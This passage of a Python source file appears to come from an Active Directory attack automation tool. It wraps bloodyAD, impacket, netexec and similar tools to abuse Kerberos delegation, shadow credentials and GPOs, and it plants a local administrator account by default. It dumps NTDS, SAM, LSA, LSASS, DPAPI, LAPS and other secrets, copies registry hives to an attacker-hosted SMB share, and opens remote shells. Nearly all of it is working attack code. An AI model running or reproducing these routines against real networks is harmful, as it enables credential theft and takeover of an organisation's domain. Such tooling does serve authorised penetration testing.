    if os.path.isfile(tgt_file):
        print(f"{GREEN}[+] TGT generated successfully:{NC} {tgt_file}")
        run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add rbcd '{target_rbcd}$' '{user_spnless}'")

        # Get session key from describeTicket
        ticketsesskey_cmd = f"{impacket_describeticket} {tgt_file} | grep 'Ticket Session Key' | cut -d ' ' -f 17"
        ticketsesskey = subprocess.check_output(ticketsesskey_cmd, shell=True, executable='/bin/bash').decode().strip()

        run_command(f"{impacket_changepasswd} {domain}/{user_spnless}@{dc_ip} -hashes :${spnless_hash} -newhashes :${ticketsesskey}")
        rbcd_spnless_output_file = f"{output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_{dc_domain}.txt"
        if os.path.exists(rbcd_spnless_output_file):
          with open(rbcd_spnless_output_file, 'r') as f:
             output = f.read()
             if "can now impersonate users" in output:
                print(f"{GREEN}[+] SPN-less RBCD Attack successful! Attempting to generate ticket to impersonate Administrator{NC}")
                run_command(f"KRB5CCNAME={tgt_file} {impacket_getST} -spn 'cifs/{target_rbcd}.{domain}' -impersonate Administrator -dc-ip {dc_ip} '{domain}/{user_spnless}' -k -no-pass")

                impersonated_ticket = os.path.join(output_dir, "Modification", f"Administrator@cifs_{target_rbcd}.{domain}@{domain.upper()}.ccache")
                if os.path.isfile(impersonated_ticket):
                    print(f"{GREEN}[+] Ticket impersonating Administrator generated successfully!{NC}")
                else:
                    print(f"{RED}[-] Generation of ticket impersonating Administrator failed!{NC}")

                print(f"{CYAN}[!] Run command below to reset password of {user_spnless}:{NC}")
                print(f"{impacket_changepasswd} {domain}/{user_spnless}@{dc_ip} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>")
                print(f"{CYAN}[!] Run command below to remove impersonation rights:{NC}")
                print(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} remove rbcd '{target_rbcd}$' '{user_spnless}'")
    else:
        print(f"{RED}[-] Failed to generate TGT{NC}")
    os.chdir(current_dir)
    print("")

def shadowcreds_attack():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return
    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)
    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: user01 or DC01$ {NC}")
    target_shadowcreds = input(">> ")
    while not target_shadowcreds:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_shadowcreds = input(">> ")

    print(f"{CYAN}[*] Performing ShadowCredentials attack against {target_shadowcreds}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add shadowCredentials '{target_shadowcreds}' --path {output_dir}/Credentials/shadowcreds_{target_shadowcreds}")
    print("")

def pygpo_abuse():
    if not pygpoabuse:
        print(f"{RED}[-] Please verify the installation of pygpoabuse{NC}")
        return
    if nullsess_bool or aeskey_bool:
        print(f"{PURPLE}[-] pygpoabuse requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    print(f"{BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}")
    print(f"{CYAN}[*] Example: 31a09564-cd4a-4520-98fa-446a2af23b4b {NC}")
    target_gpoabuse = input(">> ")
    while not target_gpoabuse:
        print(f"{RED}Invalid ID.${NC} Please specify GPO ID:")
        target_gpoabuse = input(">> ")

    print(f"{BLUE}[*] Please type 'user' if you wish to set user GPO or 'computer' to set computer GPO{NC}")
    target_userbool = input(">> ").lower()
    while target_userbool not in ["user", "computer"]:
        print(f"{RED}Invalid input.${NC} Please choose between 'user' and 'computer':")
        target_userbool = input(">> ").lower()

    userbool_gpoabuse = "-user" if target_userbool == "user" else ""
    print(f"{YELLOW}[!] {target_userbool.capitalize()} GPO chosen!{NC}")

    print(f"{BLUE}[*] Please specify command to execute. Press enter to use default: create user john with password 'H4x00r123..' as local administrator{NC}")
    command_input_gpoabuse = input(">> ")
    command_gpoabuse = f"-command {command_input_gpoabuse}" if command_input_gpoabuse else ""

    ldaps_param = "-ldaps" if ldaps_bool else ""
    run_command(f"{python3} {pygpoabuse} {argument_pygpoabuse} {ldaps_param} -dc-ip {dc_ip} -gpo-id {target_gpoabuse} {userbool_gpoabuse} {command_gpoabuse}")
    print("")

def add_unconstrained():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: DC01 or FILE01 {NC}")
    target_unconsdeleg = input(">> ")
    while not target_unconsdeleg:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_unconsdeleg = input(">> ")

    print(f"{CYAN}[*] Adding Unconstrained Delegation rights to {target_unconsdeleg}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add uac '{target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION")
    print("")

def add_spn():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: DC01 or FILE01 {NC}")
    target_spn = input(">> ")
    while not target_spn:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_spn = input(">> ")

    print(f"{CYAN}[*] Adding CIFS and HTTP SPNs to {target_spn}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set object '{target_spn}$' ServicePrincipalName -v 'HOST/{target_spn}' -v 'HOST/{target_spn}.{domain}' -v 'RestrictedKrbHost/{target_spn}' -v 'RestrictedKrbHost/{target_spn}.{domain}' -v 'CIFS/{target_spn}.{domain}' -v 'HTTP/{target_spn}.{domain}'")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set object '{target_spn}$' msDS-AdditionalDnsHostName -v '{target_spn}.{domain}'")
    print("")

def add_upn():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: user01 {NC}")
    target_upn = input(">> ")
    while not target_upn:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_upn = input(">> ")

    print(f"{BLUE}[*] Adding userPrincipalName to {target_upn}. Please specify user to impersonate:{NC}")
    print(f"{CYAN}[*] Example: user02 {NC}")
    value_upn = input(">> ")
    while not value_upn:
        print(f"{RED}Invalid name.{NC} Please specify value of upn:")
        value_upn = input(">> ")

    print(f"{CYAN}[*] Adding UPN {value_upn} to {target_upn}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set object '{target_upn}' userPrincipalName -v '{value_upn}'")

    # Provide instructions for modifying getTGT.py (assuming impacket is installed)
    print(f"{GREEN}[+] Adding UPN successful! First modify getTGT.py as shown below{NC}")
    print(f"{YELLOW}old line #58{NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.{YELLOW}NT_PRINCIPAL{NC}.value)")
    print(f"{YELLOW}new line #58{NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.{YELLOW}NT_ENTERPRISE{NC}.value)")
    print(f"{GREEN}[+] Generate Kerberos ticket of impersonated user:{NC}")
    print(f"{impacket_getTGT} {domain}/{value_upn}:< password of {target_upn} > -dc-ip {dc_ip}")
    print("")

def add_constrained():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding Constrained Delegation rights on owned account. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: DC01 or FILE01 {NC}")
    target_consdeleg = input(">> ")
    while not target_consdeleg:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_consdeleg = input(">> ")

    print(f"{CYAN}[*] Adding Constrained Delegation rights to {target_consdeleg}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add uac '{target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION")
    print("")

def add_spn_constrained():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding SPNs of Domain Controller to owned computer account (msDS-AllowedToDelegateTo). Please specify target:{NC}")
    print(f"{CYAN}[*] Example: DC01 or FILE01 {NC}")
    target_spn = input(">> ")
    while not target_spn:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_spn = input(">> ")

    print(f"{CYAN}[*] Adding DC HOST and LDAP SPNs to {target_spn}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set object '{target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/{dc_NETBIOS}' -v 'HOST/{dc_FQDN}' -v 'LDAP/{dc_NETBIOS}' -v 'LDAP/{dc_FQDN}'")

    # Provide next steps if the command was successful
    if "has been updated" in subprocess.getoutput(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set object '{target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/{dc_NETBIOS}' -v 'HOST/{dc_FQDN}' -v 'LDAP/{dc_NETBIOS}' -v 'LDAP/{dc_FQDN}'"):
      print(f"{GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket {NC}")
      print(f"{impacket_getST} -spn '< HOST/{dc_FQDN} OR LDAP/{dc_FQDN} >' -impersonate {dc_NETBIOS} {domain}/'{target_spn}$':'< password of {target_spn} >'")

    print("")

###### pwd_dump: Password Dump
def juicycreds_dump():
    print(f"{BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp{NC}")
    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
      i = i.strip()
      print(f"{CYAN}[*] Searching in {i} {NC}")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M firefox")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M keepass_discover")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M rdcman")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M teams_localdb")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M wifi")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M winscp")
    print("")

def laps_dump():
    print(f"{BLUE}[*] LAPS Dump{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} -M laps --kdcHost {dc_FQDN}")
    print("")

def gmsa_dump():
    print(f"{BLUE}[*] gMSA Dump{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] gMSA Dump requires credentials{NC}")
        return  # Exit if null session is used

    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} --gmsa")
    print("")

def secrets_dump_dcsync():
    if not impacket_secretsdump:
        print(f"{RED}[-] secretsdump.py not found! Please verify the installation of impacket{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Performing DCSync using secretsdump{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] DCSync requires credentials{NC}")
        return  # Exit if null session is used

    run_command(f"{impacket_secretsdump} {argument_imp}\\@{target} -just-dc")
    print("")

def secrets_dump():
    if not impacket_secretsdump:
        print(f"{RED}[-] secretsdump.py not found! Please verify the installation of impacket{NC}")
        return

    print(f"{BLUE}[*] Dumping credentials using secretsdump{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] secretsdump requires credentials{NC}")
        return

    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip() #remove spaces
        print(f"{CYAN}[*] secretsdump of {i} {NC}")
        run_command(f"{impacket_secretsdump} {argument_imp}\\@{i} -dc-ip {dc_ip}")
    print("")

def samsystem_dump():
    if not impacket_reg:
        print(f"{RED}[-] reg.py not found! Please verify the installation of impacket{NC}")
        return
    print(f"{BLUE}[*] Extraction SAM SYSTEM and SECURITY using reg{NC}")

    if nullsess_bool:
        print(f"{PURPLE}[-] reg requires credentials{NC}")
        return  # Skip if null session
    servers_smb_list = smb_scan() #Performs the scan
    set_attackerIP()
    print(f"{YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....{NC}")
    print(f"{impacket_smbserver} -ip {attacker_IP} -smb2support lwpshare {output_dir}/Credentials/")
    input("")  # Wait for Enter key press

    for i in open(servers_smb_list):
        i = i.strip() # remove spaces
        print(f"{CYAN}[*] reg save of {i} {NC}")
        os.makedirs(f"{output_dir}/Credentials/SAMDump/{i}", exist_ok=True)
        run_command(f"{impacket_reg} {argument_imp}\\@{i} -dc-ip {dc_ip} backup -o \\\\{attacker_IP}\\lwpshare\\SAMDump\\{i}")
    print("")

def ntds_dump():
    print(f"{BLUE}[*] Dumping NTDS using netexec{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] NTDS dump requires credentials{NC}")
        return  # Skip if null session

    run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} --ntds")
    print("")

def sam_dump():
    print(f"{BLUE}[*] Dumping SAM credentials{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] SAM dump requires credentials{NC}")
        return  # Skip if null session

    servers_smb_list = smb_scan() #Performs the scan
    for i in open(servers_smb_list):
      i = i.strip()
      print(f"{CYAN}[*] SAM dump of {i} {NC}")
      run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} --sam")
    print("")

def lsa_dump():
    print(f"{BLUE}[*] Dumping LSA credentials{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LSA dump requires credentials{NC}")
        return  # Skip if null session

    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip() # remove spaces
        print(f"{CYAN}[*] LSA dump of {i} {NC}")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} --lsa")
    print("")

def lsassy_dump():
    print(f"{BLUE}[*] Dumping LSASS using lsassy{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LSASS dump requires credentials{NC}")
        return # changed to return, as there's no point to continue
    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip() #remove spaces
        print(f"{CYAN}[*] LSASS dump of {i} using lsassy{NC}")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M lsassy")
    print("")

def handlekatz_dump():
    print(f"{BLUE}[*] Dumping LSASS using handlekatz{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LSASS dump requires credentials{NC}")
        return # changed to return, as there's no point to continue
    
    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip() #remove spaces
        print(f"{CYAN}[*] LSASS dump of {i} using handlekatz{NC}")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M handlekatz")
    print("")

def procdump_dump():
    print(f"{BLUE}[*] Dumping LSASS using procdump{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LSASS dump requires credentials{NC}")
        return  # Exit if null session is used

    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip()
        print(f"{CYAN}[*] LSASS dump of {i} using procdump {NC}")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M procdump")
    print("")

def nanodump_dump():
    print(f"{BLUE}[*] Dumping LSASS using nanodump{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LSASS dump requires credentials{NC}")
        return  # Exit if null session is used

    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip()
        print(f"{CYAN}[*] LSASS dump of {i} using nanodump {NC}")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} -M nanodump")
    print("")

def dpapi_dump():
    print(f"{BLUE}[*] Dumping DPAPI secrets using netexec{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] DPAPI dump requires credentials{NC}")
        return  # Exit if null session is used

    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip() # remove spaces
        print(f"{CYAN}[*] DPAPI dump of {i} using netexec {NC}")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} --dpapi cookies")
        run_command(f"{netexec} {ne_verbose} smb {i} {argument_ne} --dpapi nosystem")
    print("")

def donpapi_dump():
    if not donpapi:
        print(f"{RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI{NC}")
        return
    print(f"{BLUE}[*] Dumping secrets using DonPAPI{NC}")
    os.makedirs(f"{output_dir}/Credentials/DonPAPI/recover", exist_ok=True)

    if nullsess_bool:
        print(f"{PURPLE}[-] DonPAPI requires credentials{NC}")
        return  # Exit if null session is used

    servers_smb_list = smb_scan() #Performs the scan
    for i in open(servers_smb_list):
        i = i.strip() #Remove spaces
        print(f"{CYAN}[*] DonPAPI dump of {i} {NC}")
        run_command(f"{donpapi} -o {output_dir}/Credentials/DonPAPI collect {argument_donpapi} -t {i} --dc-ip {dc_ip}")
    print("")

def hekatomb_dump():
    if not hekatomb:
        print(f"{RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB{NC}")
        return

    print(f"{BLUE}[*] Dumping secrets using hekatomb{NC}")
    if nullsess_bool or kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] hekatomb requires credentials and does not support Kerberos authentication{NC}")
        return

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "Credentials"))
    run_command(f"{hekatomb} {argument_hekatomb}\\@{dc_ip} -dns {dc_ip} -smb2 -csv")
    os.chdir(current_dir)
    print("")

def bitlocker_dump():
    if not ExtractBitlockerKeys:
        print(f"{RED}[-] Please verify the installation of ExtractBitlockerKeys{NC}")
        return

    print(f"{BLUE}[*] Extracting BitLocker keys using ExtractBitlockerKeys{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] ExtractBitlockerKeys requires credentials {NC}")
        return

    verbose_p0dalirius = "-v" if verbose_bool else ""
    run_command(f"{python3} {ExtractBitlockerKeys} {argument_p0dalirius} {verbose_p0dalirius} --kdcHost {dc_FQDN} --dc-ip {dc_ip}")
    print("")

def msol_dump():
    print(f"{BLUE}[*] MSOL password dump. Please specify IP or hostname of Azure AD-Connect server:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or ADConnect01 or ADConnect01.domain.com {NC}")
    target_msol = input(">> ")
    while not target_msol:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        target_msol = input(">> ")
    run_command(f"{netexec} {ne_verbose} smb {target_msol} {argument_ne} -M msol")
    print("")

def veeam_dump():
    print(f"{BLUE}[*] Veeam credentials dump. Please specify IP or hostname of Veeam server:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or VEEAM01 or VEEAM01.domain.com {NC}")
    target_veeam = input(">> ")
    while not target_veeam:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        target_veeam = input(">> ")
    run_command(f"{netexec} {ne_verbose} smb {target_veeam} {argument_ne} -M veeam")
    print("")

def get_hash():
    if not impacket_secretsdump:
        print(f"{RED}[-] secretsdump.py not found! Please verify the installation of impacket{NC}")
        return

    gethash_nt = ""
    gethash_aes = ""
    gethash_file = os.path.join(output_dir, "Credentials", f"hash_{gethash_user}_{dc_domain}.txt")

    if not os.path.isfile(gethash_file):
        print(f"{BLUE}[*] Extracting NTLM hash and AES keys of {gethash_user}{NC}")
        if nullsess_bool:
            print(f"{PURPLE}[-] DCSync requires credentials{NC}")
            return

        run_command(f"{impacket_secretsdump} {argument_imp}\\@{target} -just-dc-user {domain.split('.')[0]}/{gethash_user}")

    else:
        print(f"{YELLOW}[i] Hash file of {gethash_user} found, skipping... {NC}")

    if os.path.exists(gethash_file):
      with open(gethash_file, 'r') as f:
          for line in f:
            if gethash_user in line and ":" in line:
              parts = line.split(":")
              if len(parts) > 3: #Ensure we avoid index errors
                gethash_nt = parts[3]
              if len(parts) > 2:   
                if "aes256" in line:
                    gethash_aes = parts[2]

    print("")

###### cmd_exec: Open CMD Console
def smbexec_console():
    if not impacket_smbexec:
        print(f"{RED}[-] smbexec.py not found! Please verify the installation of impacket {NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] smbexec requires credentials{NC}")
        return

    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com {NC}")
    smbexec_target = input(">> ")
    while not smbexec_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        smbexec_target = input(">> ")

    print(f"{BLUE}[*] Opening smbexec.py console on target: {smbexec_target} {NC}")
    run_command(f"{impacket_smbexec} {argument_imp}\\{smbexec_target}")
    print("")

def wmiexec_console():
    if not impacket_wmiexec:
        print(f"{RED}[-] wmiexec.py not found! Please verify the installation of impacket {NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] wmiexec requires credentials{NC}")
        return

    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com {NC}")
    wmiexec_target = input(">> ")
    while not wmiexec_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        wmiexec_target = input(">> ")

    print(f"{BLUE}[*] Opening wmiexec.py console on target: {wmiexec_target} {NC}")
    run_command(f"{impacket_wmiexec} {argument_imp}\\{wmiexec_target}")
    print("")

def psexec_console():
    if not impacket_psexec:
        print(f"{RED}[-] psexec.py not found! Please verify the installation of impacket {NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] psexec requires credentials{NC}")
        return

    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com {NC}")
    psexec_target = input(">> ")
    while not psexec_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        psexec_target = input(">> ")

    print(f"{BLUE}[*] Opening psexec.py console on target: {psexec_target} {NC}")
    run_command(f"{impacket_psexec} {argument_imp}\\{psexec_target}")
    print("")

def evilwinrm_console():
    if not evilwinrm:
        print(f"{RED}[-] evilwinrm not found! Please verify the installation of evilwinrm {NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] evilwinrm requires credentials{NC}")
        return
    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com {NC}")
    evilwinrm_target = input(">> ")
    while not evilwinrm_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        evilwinrm_target = input(">> ")
    print(f"{BLUE}[*] Opening evilwinrm console on target: {evilwinrm_target} {NC}")
    run_command(f"{evilwinrm} -i {evilwinrm_target} {argument_evilwinrm}")
    print("")

def ad_enum():
    os.makedirs(os.path.join(output_dir, "DomainRecon"), exist_ok=True)
    if nullsess_bool:
        ldapdomaindump_enum()
        enum4linux_enum()
        ne_gpp()
        ne_smb_enum()
        windapsearch_enum()
    else:
        bhd_enum()
        ldapdomaindump_enum()
        enum4linux_enum()
        ne_gpp()
        ne_smb_enum()
        ne_ldap_enum()
        deleg_enum()
        bloodyad_all_enum()
        bloodyad_write_enum()
        windapsearch_enum()
        ldapwordharv_enum()
        rdwatool_enum()
        ne_sccm()
        sccmhunter_enum()
        GPOwned_enum()

def adcs_enum():
    os.makedirs(os.path.join(output_dir, "ADCS"), exist_ok=True)
    if nullsess_bool:
        ne_adcs_enum()
    else:
        ne_adcs_enum()
        certi_py_enum()
        certipy_enum()
        certifried_check()

def bruteforce():
    os.makedirs(os.path.join(output_dir, "BruteForce"), exist_ok=True)
    if nullsess_bool:
        ridbrute_attack()
        kerbrute_enum()
        userpass_kerbrute_check()
        ne_pre2k()
    else:
        userpass_kerbrute_check()
        ne_pre2k()

def kerberos():
    os.makedirs(os.path.join(output_dir, "Kerberos"), exist_ok=True)
    if nullsess_bool:
        asrep_attack()
        kerberoast_attack()
        asreprc4_attack()
        john_crack_asrep()
        john_crack_kerberoast()
    else:
        asrep_attack()
        kerberoast_attack()
        john_crack_asrep()
        john_crack_kerberoast()
        nopac_check()
        ms14_068_check()

def scan_shares():
    os.makedirs(os.path.join(output_dir, "Shares"), exist_ok=True)
    smb_map()
    ne_shares()
    ne_spider()
    finduncshar_scan()

def vuln_checks():
    os.makedirs(os.path.join(output_dir, "Vulnerabilities"), exist_ok=True)
    zerologon_check()
    ms17_010_check()
    spooler_check()
    printnightmare_check()
    webdav_check()
    coerceplus_check()
    smbsigning_check()
    ntlmv1_check()
    runasppl_check()
    rpcdump_check()
    ldapnightmare_check()

def mssql_checks():
    os.makedirs(os.path.join(output_dir, "MSSQL"), exist_ok=True)
    if nullsess_bool:
        print(f"{RED}MSSQL checks requires credentials.{NC}")
    else:
        mssql_enum()
        mssql_relay_check()

def pwd_dump():
    os.makedirs(os.path.join(output_dir, "Credentials"), exist_ok=True)
    if nullsess_bool:
        print(f"{RED}Password dump requires credentials.{NC}")
    else:
        laps_dump()
        gmsa_dump()
        secrets_dump()
        nanodump_dump()
        dpapi_dump()
        juicycreds_dump()

def print_info():
    print(f"{YELLOW}[i]{NC} Target domain: {YELLOW}{dc_domain}{NC}")
    print(f"{YELLOW}[i]{NC} Domain Controller's FQDN: {YELLOW}{dc_FQDN}{NC}")
    print(f"{YELLOW}[i]{NC} Domain Controller's IP: {YELLOW}{dc_ip}{NC}")
    print(f"{YELLOW}[i]{NC} Domain Controller's ports: RPC {dc_port_135}, SMB {dc_port_445}, LDAP {dc_port_389}, LDAPS {dc_port_636}, KRB {dc_port_88}, RDP {dc_port_3389}, WinRM {dc_port_5985}")
    print(f"{YELLOW}[i]{NC} Output folder: {YELLOW}{output_dir}{NC}")
    print(f"{YELLOW}[i]{NC} User wordlist file: {YELLOW}{user_wordlist}{NC}")
    print(f"{YELLOW}[i]{NC} Password wordlist file: {YELLOW}{pass_wordlist}{NC}")
    print(f"{YELLOW}[i]{NC} Attacker's IP: {YELLOW}{attacker_IP}{NC}")
    print(f"{YELLOW}[i]{NC} Attacker's Interface: {YELLOW}{attacker_interface}{NC}")
    print(f"{YELLOW}[i]{NC} Current target(s): {YELLOW}{curr_targets} {custom_servers}{custom_ip}{NC}")

def modify_target():
    global curr_targets, custom_servers, custom_ip, custom_target_scanned

    print("")
    print(f"{YELLOW}[Modify target(s)]${NC} Please choose from the following options:")
    print("------------------------------------------------------------")
    print(f"{YELLOW}[i]{NC} Current target(s): {curr_targets} {YELLOW}{custom_servers}{custom_ip}{NC}")
    print("1) Domain Controllers")
    print("2) All domain servers")
    print("3) File containing list of servers")
    print("4) IP or hostname")
    print("back) Go back")

    option_selected = input("> ")

    if option_selected == "1":
        curr_targets = "Domain Controllers"
        custom_servers = ""
        custom_ip = ""
    elif option_selected == "2":
        curr_targets = "All domain servers"
        custom_servers = ""
        custom_ip = ""
        dns_enum()
    elif option_selected == "3":
        curr_targets = "File containing list of servers"
        custom_servers = ""
        custom_ip = ""
        custom_target_scanned = False
        if os.path.exists(custom_servers_list):
            os.remove(custom_servers_list)
        custom_servers = input(">> ")
        if not custom_servers:
          print("Error: Please specify a valid path to file")
          modify_target()
          return
        try:
            shutil.copyfile(custom_servers, custom_servers_list)
        except:
            print(f"{RED}Invalid servers list.{NC} Choosing Domain Controllers as targets instead.")
            curr_targets = "Domain Controllers"
            custom_servers = ""
        if not os.path.getsize(custom_servers_list) > 0:
            print(f"{RED}Invalid servers list.{NC} Choosing Domain Controllers as targets instead.")
            curr_targets = "Domain Controllers"
            custom_servers = ""
    elif option_selected == "4":
        curr_targets = "IP or hostname"
        custom_servers = ""
        custom_ip = ""
        custom_target_scanned = False
        if os.path.exists(custom_servers_list):
          os.remove(custom_servers_list)
        custom_ip = input(">> ")
        with open(custom_servers_list, "w") as f:
            f.write(custom_ip)
        if not os.path.getsize(custom_servers_list) > 0:
            print(f"{RED}Invalid servers list.{NC} Choosing Domain Controllers as targets instead.")
